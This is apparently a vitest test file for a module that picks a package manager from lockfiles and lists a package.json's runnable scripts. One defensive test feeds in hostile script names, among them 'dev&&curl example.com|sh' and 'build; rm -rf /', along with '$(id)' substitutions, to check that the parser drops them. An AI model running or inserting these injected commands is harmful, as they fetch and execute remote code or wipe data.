import { describe, expect, it } from "vitest";
import { detectManager, parsePackageScripts, scriptCommand } from "./scripts";

describe("which runner a folder wants", () => {
  it("reads it off the lockfile", () => {
    expect(detectManager(["bun.lock", "package.json"])).toBe("bun");
    expect(detectManager(["pnpm-lock.yaml"])).toBe("pnpm");
    expect(detectManager(["yarn.lock"])).toBe("yarn");
    expect(detectManager(["package-lock.json"])).toBe("npm");
  });

  /**
   * A repository can carry more than one. A `bun.lock` beside a stale
   * `package-lock.json` is a project that moved and did not delete the old
   * file, and running npm there installs a second, different tree.
   */
  it("prefers the newer runner when two lockfiles are present", () => {
    expect(detectManager(["package-lock.json", "bun.lock"])).toBe("bun");
    expect(detectManager(["yarn.lock", "pnpm-lock.yaml"])).toBe("pnpm");
  });

  it("falls back to npm when nothing says otherwise", () => {
    expect(detectManager(["package.json", "README.md"])).toBe("npm");
    expect(detectManager([])).toBe("npm");
  });
});

describe("the command line a script becomes", () => {
  it("gives npm its `run` and the others theirs", () => {
    expect(scriptCommand("npm", "dev")).toBe("npm run dev");
    expect(scriptCommand("bun", "dev")).toBe("bun run dev");
    expect(scriptCommand("pnpm", "build")).toBe("pnpm run build");
    expect(scriptCommand("yarn", "test")).toBe("yarn run test");
  });
});

describe("reading a package.json", () => {
  const pkg = (scripts: Record<string, unknown>) =>
    JSON.stringify({ name: "x", scripts });

  it("keeps the file's own order", () => {
    const out = parsePackageScripts(pkg({ dev: "vite", build: "vite build" }), "bun");
    expect(out.map((s) => s.name)).toEqual(["dev", "build"]);
    expect(out[0].command).toBe("bun run dev");
    expect(out[0].body).toBe("vite");
  });

  /**
   * A package manager runs these around another command; nobody launches one
   * on its own, and a `prestart` row does half of what the `start` row beside
   * it already does.
   */
  it("leaves the lifecycle hooks out", () => {
    const out = parsePackageScripts(
      pkg({ prepare: "husky", postinstall: "x", dev: "vite", prepublishOnly: "y" }),
      "npm",
    );
    expect(out.map((s) => s.name)).toEqual(["dev"]);
  });

  it("leaves out the hooks that wrap start, and keeps start itself", () => {
    const out = parsePackageScripts(
      pkg({ prestart: "a", start: "node .", poststart: "b", dependencies: "c" }),
      "npm",
    );
    expect(out.map((s) => s.name)).toEqual(["start"]);
    // `npm run start` runs it exactly as `npm start` does, so there is one
    // shape for every entry rather than a special case for this one.
    expect(out[0].command).toBe("npm run start");
  });

  /**
   * A `package.json` key is text from a cloned repository, and it ends up in a
   * command line that a shell eventually reassembles: a token carrying no space
   * and no quote reaches `bash -c` completely bare, and `$(...)` survives even
   * the quoted path. Anything outside the allowed alphabet is dropped here, at
   * the edge, rather than at one of the layers downstream that each assume
   * another one did it.
   */
  it("drops a name that would carry shell syntax into the command line", () => {
    const hostile = {
      "dev&&curl example.com|sh": "vite",
      "build; rm -rf /": "vite build",
      "test$(id)": "vitest",
      "lint`id`": "oxlint",
      "a\nb": "x",
      "quoted 'name'": "x",
      'say"hi"': "x",
      "expand$HOME": "x",
      "sub>out": "x",
      "": "x",
      dev: "vite",
    };
    const out = parsePackageScripts(pkg(hostile), "npm");
    expect(out.map((s) => s.name)).toEqual(["dev"]);
  });

  /** Scopes, colons, dots and dashes are what real script names are made of. */
  it("keeps the punctuation a script name legitimately uses", () => {
    const out = parsePackageScripts(
      pkg({
        "test:unit": "vitest",
        "build.prod": "vite build",
        "check-all": "x",
        "@scope/gen": "y",
        build_2: "z",
      }),
      "bun",
    );
    expect(out.map((s) => s.name)).toEqual([
      "test:unit",
      "build.prod",
      "check-all",
      "@scope/gen",
      "build_2",
    ]);
  });

  it("ignores a script whose body is not a string", () => {
    expect(parsePackageScripts(pkg({ dev: { cmd: "vite" } }), "npm")).toEqual([]);
  });

  /** A file mid-edit is not an error worth a toast, only an empty list. */
  it("answers nothing for a file that does not parse", () => {
    expect(parsePackageScripts("{ not json", "npm")).toEqual([]);
    expect(parsePackageScripts("", "npm")).toEqual([]);
  });

  it("answers nothing for a package with no scripts", () => {
    expect(parsePackageScripts(JSON.stringify({ name: "x" }), "npm")).toEqual([]);
    expect(parsePackageScripts(JSON.stringify({ scripts: null }), "npm")).toEqual([]);
    expect(parsePackageScripts(JSON.stringify([1, 2]), "npm")).toEqual([]);
  });
});
